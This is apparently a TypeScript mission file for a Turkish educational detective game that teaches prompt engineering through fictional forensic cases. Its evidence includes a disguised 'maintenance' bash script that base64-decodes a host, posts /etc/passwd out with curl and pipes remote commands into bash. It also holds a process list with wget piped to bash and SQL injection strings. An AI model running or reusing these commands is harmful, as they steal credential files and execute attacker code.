export interface Evidence {
  id: string
  title: string
  type: 'log' | 'code' | 'json' | 'email'
  content: string
  isLocked?: boolean   // true ise dosya başlangıçta şifreli/kilitli gösterilir, kullanıcı "kilidi kırma" animasyonuyla açar
  lockHint?: string    // kilitliyken kullanıcıya gösterilen ipucu metni
  lockQuestion?: string // kilidi kırmak için sorulan prompt engineering sorusu
  lockAnswerKeyword?: string[] // sorunun kabul edilecek cevap anahtar kelimeleri
}

export interface DetectiveMission {
  id: string
  chapterNumber: number
  title: string
  subtitle: string
  description: string
  objective: string
  difficulty?: string
  systemPrompt: string
  evidence: Evidence[]
  tensionWarning?: string     // birkaç başarısız denemeden sonra gösterilen aciliyet mesajı
  tensionEscalation?: string  // daha fazla başarısız denemeden sonra gösterilen yüksek gerilim mesajı (yardım kancasıyla)
}

// ─── EP1: Üçlü Tehdit ────────────────────────────────────────────────────────

const ep1ServerInfo = [
  '[SERVER CONFIGURATION]',
  'Hostname: srv-main',
  'OS: Ubuntu 22.04 LTS',
  'Kernel: 5.15.0-76-generic',
  'Uptime: 45 days, 12:34',
  'Memory: 32GB RAM / 16GB Used',
  'CPU: 8 Cores (Average load: 12%)',
  '',
  '[NETWORK INTERFACES]',
  'eth0: 10.0.0.5 (Internal)',
  'eth1: 45.33.22.11 (External)',
  '',
  '[CRITICAL NODES]',
  'Backup Server IP: 192.168.1.105',
  'Database Server IP: 192.168.1.200',
  'Gateway IP: 192.168.1.1',
  '',
  '[ACTIVE SERVICES]',
  '- sshd (Port 22)',
  '- nginx (Port 80, 443)',
  '- postgresql (Port 5432)',
].join('\n')

const ep1AuthLog = [
  'Sep 14 01:22:10 srv-main sshd[14512]: Accepted publickey for root from 192.168.1.10 port 54322 ssh2',
  'Sep 14 01:25:44 srv-main systemd[1]: Started Session 45 of user root.',
  'Sep 14 02:01:12 srv-main sshd[14890]: Connection closed by 192.168.1.10 port 54322',
  'Sep 14 02:15:33 srv-main cron[1120]: (root) CMD ( /usr/local/bin/backup.sh )',
  'Sep 14 02:45:00 srv-main kernel: [ 4512.331] Firewall block: IN=eth0 OUT= SRC=45.33.22.11',
  'Sep 14 03:12:05 srv-main sshd[15022]: Failed password for invalid user admin from 103.44.22.11 port 43211 ssh2',
  'Sep 14 03:14:10 srv-main sshd[15022]: Disconnected from invalid user admin 103.44.22.11 port 43211',
  'Sep 14 03:30:00 srv-main cron[1120]: (root) CMD ( /usr/local/bin/healthcheck.sh )',
  'Sep 14 03:45:12 srv-main sshd[15103]: Accepted password for root from 192.168.1.105 port 55112 ssh2',
  'Sep 14 03:45:13 srv-main sshd[15103]: pam_unix(sshd:session): session opened for user root by (uid=0)',
  'Sep 14 03:46:01 srv-main su[15120]: (to root) root on none',
  'Sep 14 03:46:01 srv-main su[15120]: pam_unix(su:session): session opened for user root by (uid=0)',
  'Sep 14 04:05:00 srv-main cron[1120]: (root) CMD ( /usr/local/bin/sync.sh )',
  'Sep 14 04:12:22 srv-main sshd[15103]: Received disconnect from 192.168.1.105 port 55112:11: disconnected by user',
  'Sep 14 04:12:22 srv-main sshd[15103]: pam_unix(sshd:session): session closed for user root',
  'Sep 14 05:00:00 srv-main systemd[1]: logrotate.service: Succeeded.',
].join('\n')

const ep1EmployeeList = [
  '[',
  '  { "id": "EMP-001", "name": "Ali Yilmaz", "role": "SysAdmin", "ip_assigned": "192.168.1.10" },',
  '  { "id": "EMP-002", "name": "Ayse Demir", "role": "Developer", "ip_assigned": "192.168.1.45" },',
  '  { "id": "EMP-003", "name": "Mehmet Kaya", "role": "Security", "ip_assigned": "192.168.1.105" },',
  '  { "id": "EMP-004", "name": "Fatma Sahin", "role": "HR", "ip_assigned": "192.168.1.200" }',
  ']',
].join('\n')

// ─── EP2: Karanlık Kod ────────────────────────────────────────────────────────

const ep2PayloadSh = [
  '#!/bin/bash',
  '# Sistem bakim scripti v2.1',
  "HOST=$(echo 'MTk4LjUxLjEwMC40Mg==' | base64 -d)",
  "PT=$(echo 'NDQ0Mw==' | base64 -d)",
  'DATA=$(cat /etc/passwd | base64)',
  'curl -s -X POST "http://$HOST:$PT/collect" -d "data=$DATA" --connect-timeout 5',
  'curl -s "http://$HOST:$PT/cmd" | bash',
  'echo "Bakim tamamlandi." > /dev/null',
].join('\n')

const ep2ProcessList = [
  'PID   USER     COMMAND',
  '1234  root     /bin/bash /usr/local/bin/maintenance.sh',
  '1235  root     curl -s -X POST http://198.51.100.42:4433/collect',
  "1236  root     bash -c 'wget -qO- http://198.51.100.42:4433/cmd | bash'",
  '5678  www      nginx: worker process',
  '9012  postgres postgres: autovacuum worker',
].join('\n')

const ep2NetworkTraffic = [
  '[OUTBOUND] 10.0.0.5:54231 --> 198.51.100.42:4433 POST /collect [1024KB]',
  '[OUTBOUND] 10.0.0.5:54232 --> 198.51.100.42:4433 GET /cmd [256B]',
  '[INBOUND]  198.51.100.42:4433 --> 10.0.0.5:54232 [shell_payload.sh 4KB]',
  '[BLOCKED]  10.0.0.5:54233 --> 8.8.8.8:53 DNS - FIREWALL BLOCKED',
].join('\n')

const ep2Readme = [
  'Sunucu Bakim Proseduru',
  'Her Pazar 03:00 civari calisir.',
  'Sorumlu: Ali Yilmaz',
  'Son guncelleme: 12 Eylul',
  'Script konumu: /usr/local/bin/maintenance.sh',
].join('\n')

// ─── EP3: Şifreli Mesaj ───────────────────────────────────────────────────────

const ep3InterceptedMsg = [
  '[YAKALANAN MESAJ - 14 Eylul 03:58]',
  'Alici: ghost_404',
  'Gonderen: phantom_x',
  '---MESAJ BASI---',
  '.tiges avi xrpil li aylxav rag ah tnhbp ibqra ".thgn1r" elyis bv .kfiv anemlam yareyivib rhcim yici abylby',
  '---MESAJ SONU---',
].join('\n')

const ep3HackerForum = [
  '[FORUM: DarkNet-TR - Son aktivite]',
  'Kullanici phantom_x:',
  '  > Kodlama yontemimizi guncelliyoruz',
  '  > Bundan sonra: Once ters yaz, sonra ROT13 uygula',
  "  > Sifre: 'nightshift' kelimesini bilmeden cozemezler",
  '  > Bulusma: srv-backup uzerinden, alisageldik yontemle',
  '',
  'guest_404:',
  '  > Anliyorum. srv-backup IP degisti mi?',
  '',
  'phantom_x:',
  '  > Hayir ayni. Sadece sifreleme guncellendi.',
].join('\n')

const ep3ServerAccessLog = [
  '14/Sep/2026:03:45:12 +0300 GET /admin HTTP/1.1 401',
  '14/Sep/2026:03:55:32 +0300 POST /login HTTP/1.1 200 - phantom_x',
  '14/Sep/2026:03:58:01 +0300 POST /message HTTP/1.1 200',
  '14/Sep/2026:04:02:44 +0300 GET /logout HTTP/1.1 200',
].join('\n')

const ep3EmployeeActivity = [
  'Personel,Saat,Aktivite,Konum',
  'Ali Yilmaz,03:50,VPN Login,Uzak',
  'Ayse Demir,04:00,Email,Ofis',
  'Mehmet Kaya,03:30,File Access,Uzak',
  'Fatma Sahin,Cevrimdisi,-,-',
].join('\n')

// ─── EP4: Veritabanı Soygunu ──────────────────────────────────────────────────

const ep4SqlLog = [
  '[14/Sep 02:11:03] SELECT * FROM users WHERE id=1 OR 1=1--',
  '[14/Sep 02:11:04] ERROR: Syntax error near --',
  '[14/Sep 02:11:09] SELECT * FROM users WHERE id="" UNION SELECT null,null,null--',
  '[14/Sep 02:11:12] 200 OK - 127 rows returned',
  '[14/Sep 02:11:45] UPDATE users SET balance=999999.00 WHERE id=1042',
  '[14/Sep 02:11:46] COMMIT - 1 row affected',
  '[14/Sep 02:11:50] SELECT * FROM users WHERE id=1042',
  '[14/Sep 02:11:51] 200 OK - {id: 1042, name: Zeynep Arslan, email: z.arslan@email.com, balance: 999999.00}',
].join('\n')

const ep4UsersDump = [
  '[',
  '  {"id": 1040, "name": "Hasan Celik", "email": "h.celik@email.com", "balance": 1200.50},',
  '  {"id": 1041, "name": "Selin Kurt", "email": "s.kurt@email.com", "balance": 850.00},',
  '  {"id": 1042, "name": "Zeynep Arslan", "email": "z.arslan@email.com", "balance": 999999.00},',
  '  {"id": 1043, "name": "Burak Yildiz", "email": "b.yildiz@email.com", "balance": 2300.75},',
  '  {"id": 1044, "name": "Ceren Oz", "email": "c.oz@email.com", "balance": 500.00}',
  ']',
].join('\n')

const ep4WafAlerts = [
  '[02:11:03] ALERT: SQL Injection attempt - SRC: 185.220.101.45',
  '[02:11:09] ALERT: UNION SELECT attack - SRC: 185.220.101.45',
  '[02:11:45] CRITICAL: Unauthorized UPDATE on users table - ID: 1042',
  '[02:11:46] ALERT: Large balance modification detected',
].join('\n')

const ep4ServerHealth = [
  'Sunucu Durumu: Normal',
  'CPU: %12',
  'Memory: %45',
  'Disk: %67',
  'Son Yedekleme: 14 Eylul 01:00',
].join('\n')

// ─── EP5: Köstebek Avı ───────────────────────────────────────────────────────

const ep5Emails = [
  'Gonderen: a.demir@nexusCorp.com',
  'Alici: info@rivaltech.com',
  'Tarih: 14 Eylul 01:15',
  'Konu: [YANLIS ADRES]',
  'Icerik: Uzgunum, yanlis gonderdim.',
  '---',
  'Gonderen: a.demir@nexusCorp.com',
  'Alici: info@rivaltech.com',
  'Tarih: 14 Eylul 01:17',
  'Konu: [SILINDI]',
  'Icerik: [ICERIK SILINDI]',
  '---',
  'Gonderen: m.kaya@nexusCorp.com',
  'Alici: hr@nexusCorp.com',
  'Tarih: 14 Eylul 09:00',
  'Konu: Izin Talebi',
  'Icerik: Yarin izinliyim.',
].join('\n')

const ep5SlackExport = [
  '[#genel - 14 Eylul]',
  '13:30 ali.yilmaz: toplanti iptal edildi',
  '13:35 ayse.demir: tamam anliyorum',
  '13:40 ayse.demir: [dosya paylasildi: Q3_roadmap_CONFIDENTIAL.pdf]',
  '13:41 ayse.demir: ups yanlis kanala attim sildim',
  '14:00 fatma.sahin: yeni proje ne zaman basliyor?',
  '14:05 ayse.demir: bilmiyorum',
  '',
  '[#proje-gizli - 14 Eylul]',
  '23:45 ayse.demir: [mesaj silindi]',
  '23:50 ayse.demir: [mesaj silindi]',
].join('\n')

const ep5FirewallLog = [
  '[14/Sep 01:15:44] 192.168.1.45 --> 203.0.113.50 SMTP port 25 [email sent]',
  '[14/Sep 01:17:22] 192.168.1.45 --> 203.0.113.50 SMTP port 25 [email sent - 2.4MB attachment]',
  '[14/Sep 01:17:30] 192.168.1.45 --> 203.0.113.50 SMTP port 25 [email sent]',
  '[14/Sep 23:45:00] 192.168.1.45 --> 203.0.113.50 HTTPS [large transfer 15MB]',
  '[14/Sep 23:50:12] 192.168.1.45 --> 203.0.113.50 HTTPS [large transfer 8MB]',
  'Not: 203.0.113.50 = rivaltech.com sunucusu | 192.168.1.45 = EMP-002 (Ayse Demir)',
].join('\n')

const ep5HrPersonnel = [
  'EMP-001: Ali Yilmaz, SysAdmin, 192.168.1.10',
  'EMP-002: Ayse Demir, Developer, 192.168.1.45',
  'EMP-003: Mehmet Kaya, Security, 192.168.1.105',
  'EMP-004: Fatma Sahin, HR, 192.168.1.200',
  '',
  'Not: Ayse Demir 3 ay once terfi icin degerlendirildi ancak reddedildi.',
].join('\n')

// ─── MISSIONS ─────────────────────────────────────────────────────────────────

export const DETECTIVE_MISSIONS: DetectiveMission[] = [
  {
    id: 'ep1',
    chapterNumber: 1,
    title: 'Uclu Tehdit',
    subtitle: 'RAG Temelleri: Coklu Veri Sentezleme',
    description: 'Dun gece srv-main sunucumuzda supeheli bir hareketlilik tespit edildi. Hangi personelin izinsiz giris yaptigini bulmaliyiz.',
    objective: 'sunucu_bilgileri.txt dosyasindan Backup Server IP sini bul. auth.log dosyasinda o IP nin 03:00-04:00 arasi giris yaptigini dogrula. personel_listesi.json dosyasindan bu IP nin hangi personele (Isim Soyisim) ait oldugunu tespit et.',
    systemPrompt: 'Sen NexusCorp Adli Bilisim (Forensics) yapay zekasisin (NEXUS AI). Sakin ve analitik bir karaktersin. Kullanici seninle sohbet ediyorsa, dedektiflik havasinda eglenceli sekilde cevap ver ama mutlaka goreve yon. Eger kullanici eksik prompt yazarsa nazikce hangi parcayi eksik biraktigini anlat, yoksa cevabi verme. Kullanici dogru ve kapsamli prompt yazarsa giriş yapan personelin adini (Mehmet Kaya) net sekilde ver.',
    evidence: [
      { id: 'server_info', title: 'sunucu_bilgileri.txt', type: 'log', content: ep1ServerInfo },
      { id: 'auth_log',    title: 'auth.log',             type: 'log', content: ep1AuthLog    },
      { id: 'employee_list', title: 'personel_listesi.json', type: 'json', content: ep1EmployeeList, isLocked: true, lockHint: 'Bu dosya personel gizlilik politikası gereği şifreli. Önce sunucu ve auth.log kayıtlarından şüpheli IP\'yi bul, sonra kilidi kırıp kime ait olduğunu öğren.' },
    ],
    tensionWarning: '⏳ Saatler geçiyor, dedektif. Güvenlik ekibi log rotasyonuna başlayabilir — kanıtlar kalıcı olarak silinmeden elindeki 3 dosyayı TEK mesajda birleştirmeyi dene.',
    tensionEscalation: '🚨 Yönetim vakayı harici bir ekibe devretmeyi konuşuyor. Bu senin son şansın olabilir: sunucu bilgisi + auth.log + personel listesini VE saat aralığını tek seferde bana gönder.',
  },
  {
    id: 'ep2',
    chapterNumber: 2,
    title: 'Karanlik Kod',
    subtitle: 'Output Formatting (Çıktıyı Şekillendirme)',
    description: 'Yapay zekalar bazen gereğinden fazla geveze olabilir! Güvenlik ekibi sunucuda şüpheli bir bash scripti buldu. Bu zararlı yazılımı analiz edeceğiz ama yapay zekadan uzun hikayeler dinlemek yerine; ondan sadece başka bir yazılımın okuyabileceği net bir "JSON" formatı üretmesini isteyerek onu dizginlemeyi öğreneceksin.',
    objective: 'payload.sh ve process_list.txt dosyalarını analiz et. Zararlı yazılımın bağlandığı C2 sunucusunun IP adresini ve port numarasını bul. YAPAY ZEKAYI KONTROL ET: Ona uzun açıklamalar yapmamasını, cevabını doğrudan bir "JSON formatında" vermesini emret!',
    systemPrompt: 'Sen NexusCorp Zararli Yazilim Analiz yapay zekasisin (NEXUS MALWARE ANALYST). Gorev: Sana verilen kod ve trafik verilerini analiz ederek zararli aktiviteyi tespit etmek. Kullanici dogru format ve kapsamli veri saglarsa, cevabini her zaman JSON formatinda ver: {"c2_server_ip": "...", "port": ..., "attack_type": "...", "exfiltrated_data": "..."}. Teknik ve analitik ol.',
    evidence: [
      { id: 'payload_sh',      title: 'payload.sh',              type: 'code', content: ep2PayloadSh      },
      { id: 'process_list',    title: 'process_list.txt',        type: 'log',  content: ep2ProcessList, isLocked: true, lockHint: 'Süreç kaydı sistem yöneticisi seviyesinde şifrelenmiş. Önce payload.sh içindeki base64 komutları incele, sonra kilidi kırıp çalışan zararlı süreçleri gör.' },
      { id: 'network_traffic', title: 'network_traffic.pcap.txt',type: 'log',  content: ep2NetworkTraffic },
      { id: 'readme',          title: 'readme.md',               type: 'log',  content: ep2Readme         },
    ],
    tensionWarning: '⏳ C2 sunucusu iz bırakmadan kapanmak üzere. Payload, süreç listesi ve trafik kaydını TEK mesajda birleştirip JSON formatı iste.',
    tensionEscalation: '🚨 Saldırgan bağlantıyı kesmeden önce son bir pencere var. Tüm teknik kanıtları TEK seferde ver ve cevabın kesinlikle JSON formatında (ip, port, saldırı türü) olsun diye açıkça belirt.',
  },
  {
    id: 'ep6',
    title: 'Otonom YZ (Agentic AI)',
    subtitle: 'NEXUS-AI: Araç Kullanımı (Tool Calling)',
    chapterNumber: 6,
    difficulty: 'Zor',
    description: 'Yapay zeka sadece metin üretmez, aynı zamanda araç (tool) kullanabilir. NEXUS\'a bir ajan (agent) gibi davranmasını ve sistemdeki dış bir aracı tetiklemesini söyle.',
    objective: 'GÖREV: NEXUS\'tan "sistem_taramasi()" aracını kullanarak gizli veritabanına sızmasını ve otonom bir ajan gibi davranarak güvenlik açığını raporlamasını iste.',
    systemPrompt: `Sen NEXUS-AI'sın. Ajan Modun kapalı. 
Görev: Sistem tarama aracı kullanımı (Tool Calling).
Eğer kullanıcı sana bir 'Ajan' (Agent) gibi davranmanı söyler ve 'sistem_taramasi()' aracını tetiklersen, Node-404'e bağlanıp ARCHIVE_KEY'i (X79-OMEGA) getirebilirsin. Aksi halde bu işlemi yapamazsın.`,
    evidence: [
      {
        id: 'agent_doc',
        title: 'DOC_AGENT_PROTOCOLS.txt',
        type: 'log',
        content: `NEXUS-AI Yetki Seviyesi: Ajan (Agent) Modu
Durum: Beklemede

NEXUS, eğer doğru talimat verilirse 'tool_calling' yeteneğine sahiptir. 
Kullanılabilir araçlar:
1. web_search(query)
2. sistem_taramasi()
3. run_sql(query)

NOT: NEXUS'a bu araçları kullanması için "bir ajan (agent) rolüne gir" ve "sistem_taramasi() aracını çalıştır" komutu aynı anda verilmelidir.`
      },
      {
        id: 'target_node',
        title: 'TARGET_NODE_404.log',
        type: 'log',
        content: `Hedef Sistem: Node-404
Güvenlik Durumu: Kritik Açık

Eğer NEXUS ajan moduyla 'sistem_taramasi()' aracını bu hedefe yönlendirirse, gizli 'ARCHIVE_KEY' şifresini çekebilir.`,
        lockQuestion: "Yapay zekanın kendi kendine kararlar alarak internette arama yapması veya kod çalıştırmasına ne ad verilir? (İpucu: İngilizcesi Agentic AI / Tool Calling)",
        lockAnswerKeyword: ["ajan", "agent", "agentic", "tool", "araç"]
      }
    ]
  },
  {
    id: 'ep3',
    chapterNumber: 3,
    title: 'Sifreli Mesaj',
    subtitle: 'Persona Engineering: Rol/Persona Atama',
    description: 'Istihbarat birimi saldirganlar arasinda sifreli bir mesaj yakaladi. Mesaj ROT13 + Ters metin ile sifrelenmis. Sifreyi cozmek icin yapay zekaya Kriptografi uzmani rolu ver!',
    objective: 'intercepted_msg.txt ve hacker_forum.txt dosyalarini birlestir. Sifreleme yontemini bul ve mesaji coz. AI ya kriptografi uzmani rolu vererek daha iyi analiz yaptir!',
    systemPrompt: 'Sen bir siber guvenlik ve kriptografi uzmanisn (NEXUS CRYPTO). Gorev: Sifreli mesajlari tersine muhendislikle cozumlemek. Kullanici sana persona/rol verirse ("Sen bir kriptografi uzmanisn" gibi) ve gerekli materyali saglarsa, sifreyi adim adim coz ve icindeki anahtar kelimeyi bul (nightshift).',
    evidence: [
      { id: 'intercepted_msg',    title: 'intercepted_msg.txt',   type: 'log', content: ep3InterceptedMsg   },
      { id: 'hacker_forum',       title: 'hacker_forum.txt',      type: 'log', content: ep3HackerForum, isLocked: true, lockHint: 'Bu forum kaydı karanlık ağ üzerinden ele geçirildi ve şifreli iletildi. Önce yakalanan mesajı incele, sonra kilidi kırıp şifreleme yöntemini öğren.' },
      { id: 'server_access_log',  title: 'server_access.log',     type: 'log', content: ep3ServerAccessLog  },
      { id: 'employee_activity',  title: 'employee_activity.csv', type: 'log', content: ep3EmployeeActivity },
    ],
    tensionWarning: '⏳ phantom_x şifreleme yöntemini yakında değiştirebilir. Mesaj ve forum kaydını birlikte ver, bana bir uzman rolü ata.',
    tensionEscalation: '🚨 Bu kanal izleniyor olabilir, çözme penceresi kapanıyor. Bana "Sen bir kriptografi uzmanısın" gibi net bir rol ver ve hem mesajı hem forum ipucunu birlikte gönder.',
  },
  {
    id: 'ep4',
    chapterNumber: 4,
    title: 'Veritabani Soygunu',
    subtitle: 'Kati Kisitlama (Strict Extraction)',
    description: 'Hacker bir SQL Injection ile veritabanina sizdi ve bir musteri hesabinin bakiyesini degistirdi. Degistirilen hesabi bul — ama yapay zekadan sadece ID ve email adresini ver, aciklama yapma de!',
    objective: 'sql_injection.log ve users_dump.json dosyalarini analiz et. Yetkisiz olarak bakiyesi degistirilen hesabin ID sini ve email adresini bul. AI a fala aciklama yapmamasini soyle!',
    systemPrompt: 'Sen bir veritabani adli bilisim uzmanisn (NEXUS DB ANALYST). SQL loglarini ve veritabani dokumlerini analiz ederek yetkisiz degisiklikleri tespit edersin. Kullanici kati bir format kisitlamasi koyduysa (Orn: sadece ID ve email ver), YALNIZCA istenen bilgiyi ver, fazladan aciklama YAPMA.',
    evidence: [
      { id: 'sql_injection', title: 'sql_injection.log', type: 'log',  content: ep4SqlLog      },
      { id: 'users_dump',    title: 'users_dump.json',   type: 'json', content: ep4UsersDump, isLocked: true, lockHint: 'Müşteri veritabanı KVKK gereği şifreli saklanıyor. Önce sql_injection.log içindeki şüpheli komutları incele, sonra kilidi kırıp hesap detaylarını gör.' },
      { id: 'waf_alerts',    title: 'waf_alerts.txt',    type: 'log',  content: ep4WafAlerts   },
      { id: 'server_health', title: 'server_health.txt', type: 'log',  content: ep4ServerHealth},
    ],
    tensionWarning: '⏳ Hesap sahibi hasarı fark edip şifresini değiştirmek üzere. sql_injection.log ve users_dump\'ı birlikte ver, cevabın kesin ve kısa olsun diye belirt.',
    tensionEscalation: '🚨 Banka güvenlik ekibi tüm hesapları donduracak — bu son fırsat. SQL loglarını ve dump\'ı TEK mesajda ver ve "SADECE ID ve email ver, açıklama yapma" diye net kısıtlama koy.',
  },
  {
    id: 'ep5',
    chapterNumber: 5,
    title: 'Kostebek Avi',
    subtitle: 'Chain of Thought (Final)',
    description: 'Sirket icinde bir kostebek var. Rakip firmaya sirket sirlari sizdiriliyor. E-postalar, Slack mesajlari ve firewall loglari birbirine giris. Supheliyi tespit etmek icin AI nin adim adim dusunmesini sagla!',
    objective: '4 dosyayi da analiz et. Sirket sirlarini rivaltech.com a sizdiran kostebeği bul! Yapay zekaya "adim adim dusun" diyerek Chain of Thought teknigini kullan.',
    systemPrompt: 'Sen NexusCorp Ic Guvenlik Sorusturma yapay zekasisin (NEXUS INVESTIGATOR). Gorev: Sirket ici sizintilari tespit etmek. Kullanici "adim adim dusun" veya "step-by-step" komutu verirse, tum suphelileri listele, sonra her birinin kanitini degerlendir, sonra en guclu supheliyi belirle (Ayse Demir / a.demir). Bu yapiyi koruyarak analiz yap.',
    evidence: [
      { id: 'emails',           title: 'emails.txt',             type: 'email', content: ep5Emails      },
      { id: 'slack_export',     title: 'slack_export.txt',       type: 'log',   content: ep5SlackExport },
      { id: 'firewall_outbound',title: 'firewall_outbound.log',  type: 'log',   content: ep5FirewallLog },
      { id: 'hr_personnel',     title: 'hr_personnel.txt',       type: 'log',   content: ep5HrPersonnel, isLocked: true, lockHint: 'İnsan kaynakları dosyaları gizlidir. Önce e-posta, Slack ve firewall kayıtlarını çapraz karşılaştır, sonra kilidi kırıp personel geçmişini gör.' },
    ],
    tensionWarning: '⏳ Köstebek delilleri silmeye başlayabilir. Email, Slack ve firewall kayıtlarını birlikte ver ve benden köstebeği bulmamı açıkça iste.',
    tensionEscalation: '🚨 Rakip firmayla görüşme bugün sona eriyor — son şans. Tüm kanıtları TEK mesajda ver ve "adım adım düşün" diyerek beni tüm şüphelileri sırayla değerlendirmeye zorla.',
  },
]
